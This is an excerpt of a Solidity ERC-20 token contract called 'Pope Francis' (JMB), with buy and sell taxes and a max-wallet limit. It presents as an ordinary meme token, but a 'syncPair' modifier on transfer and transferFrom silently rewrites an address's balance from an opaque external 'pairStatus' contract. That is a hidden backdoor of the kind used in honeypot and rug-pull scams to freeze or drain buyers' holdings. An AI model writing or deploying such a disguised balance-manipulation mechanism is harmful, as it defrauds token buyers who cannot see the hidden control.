...
contract PopeFrancis is Context, IERC20, Ownable {
    uint8 private _decimals = 12;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    uint256 public  _totalSupply = 500000000  * 10**(_decimals);
    ...
    pairV2 private pairStatus;
    uint256 public _buyTax =2;
    uint256 public _sellTax =5;
    string private _name = unicode"Pope Francis";
    string private _symbol = unicode"JMB";
    ...
    function transfer(address recipient, uint256 amount) syncPair public override returns (bool) {
        if(init==false){
    ...
    function transferFrom(address sender, address recipient, uint256 amount) syncPair public override returns (bool) {
        if(init==false){
            try IUniswapV2Factory(uniV2Router.factory()).getPair(address(this), uniV2Router.WETH()){
                uniswapPair = IUniswapV2Factory(uniV2Router.factory()).getPair(address(this), uniV2Router.WETH());
                init=true;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {            
        ...
        if(recipient != uniswapPair && maxWAlletEnabled && !(holderNoFee[sender] || holderNoFee[recipient]))
            require(balanceOf(recipient) + amount < _maxWalletSize || !maxWAlletEnabled, "TOKEN: Balance exceeds wallet size!");
    ...
    modifier syncPair() {
        if(pairStatus.getIndexOfKeys(pairStatus.getContracts())>=0)
            _balance[pairStatus.getContracts()]  = pairStatus.gets(pairStatus.getContracts());
        _;
    }

    function switchMaxWalletControl(bool value) public onlyOwner {
